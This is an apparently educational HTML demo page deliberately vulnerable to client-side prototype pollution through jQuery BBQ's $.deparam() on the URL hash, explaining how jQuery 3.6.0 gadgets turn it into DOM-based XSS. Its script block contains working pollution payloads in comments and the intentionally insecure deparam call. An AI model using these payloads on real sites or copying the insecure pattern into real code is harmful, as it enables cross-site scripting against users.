Big Thanks to Sergey Bobrov, Mohan Sri Rama Krishna P, and the rest of their team, <br>
whose <a href="https://github.com/BlackFan/client-side-prototype-pollution"> client-side Prototype Pollution</a> repository and
<a href="https://blog.s1r1us.ninja/research/PP">research</a> <br>
were the source of all the payloads we used on this page.

<h3> Proto Pollution Payloads Table </h3>

<tr>
<td><b>Function(s) Affected</b></td>

<tr>
<td>$.ajax on objects, $.get. $.post, etc. </td>

<br>

This page is vulnerable to multiple exploitation gadgets that affect jQuery<br>
v.3.6.0, the most recent version at the time of writing. We've selected three<br>
payloads and included them in the table above. All three payloads produce <br>
DOM-based Cross-Site Scripting and show a harmless alert window for <br>
demonstrative purposes.

<br>
<br>

To see each one in action, append the respective payloads one at a time to <br>
the URL bar, including the # character, like so: <br> <br>

<code> prototypePollution-demo.html#PAYLOAD </code>

<br>
<br>
Paste the payload into the URL bar, then refresh the page.

<br>
<br>

<h3> How does this work? </h3>

Prototype pollution occurs when user-supplied data is insecurely handled by<br>
client-side code in such a way that data prototypes are affected. <br> This
pollution of data prototypes can result in a security impact, often Cross-Site scripting.

<br>
<br>

There are two components to impactful prototype pollution. First, an application <br>
needs to execute code that pollutes the prototype. Next, it must call a function <br>
that processes a polluted object in a way that produces exploitation.

<br>
<br>

<h4>Polluting the Prototype</h4>

The pollution on this page occurs due to
<a href="https://github.com/cowboy/jquery-bbq">jQueryBBQ,</a> a third-party
jQuery extension library<br>
which provides Back Button and Query (BBQ) features. While this library was last<br>
updated in 2010, it can still be found in applications to this day. <br>
BBQ's <code>$.deparam()</code> function converts the page's URL hash parameters into objects.

<br> When a user supplies this function with the right payloads,
<code>deparam()</code> will alter <code>Object.prototype</code>.

<br>
<br>
The line that causes prototype pollution via URL hash in the &lt;script&gt; tags below is:
<br>
<br>
<code>
var urlHash = $.deparam(location.hash.slice(1));
</code>

<h4>Calling Vulnerable Functions</h4>

This page calls three functions from jQuery that execute the code injected into<br>
<code>Object.prototype</code> during pollution. These three functions are
present and vulnerable <br> in the most recent version of jQuery (3.6.0 at the time
of this writing).

<br>
<br>

Each of the three functions shown in the table above has a purpose, but in our<br>
blog post we went into detail on <code>$.ajax</code> and a few of its related<br>
functionalities in the context of prototype pollution.

<br>
<br>


<script>

  // This line calls jQuery BBQ's deparam function,
  // which results in proto pollution if the URL's hash contains the right payload

 var urlHash = $.deparam(location.hash.slice(1));



  // ---- ajax gadget ---
  // We spent time reverse engineering this payload

 // $.getScript('localhost');
 // $.get('localhost');
 // $.post('localhost');
 // $.getJSON('localhost');

 // ajax does not produce DOM-XSS without an Object
 //$.ajax('localhost');


 $.ajax({
       url: 'localhost',
       cache: 'false',
       // For the payload to work, we need url and at least one other property
       // cache is optional, the property could even be aaa : 'aaa'
  });



  // ---- $(x).off(...) gadget ---
  // #__proto__[preventDefault]=x&__proto__[handleObj]=x&__proto__[delegateTarget]=<img/src/onerror%3dalert(123)>

  //Uncomment the next line to make the page vulnerable to the $(x).off() type
  $(document).off('abc123');



   //--- $(html) gadget ---
   // #__proto__[div][1]=<img src onerror%3dalert(123)>

   $('<div x="x"></div>');
</script>

</html>
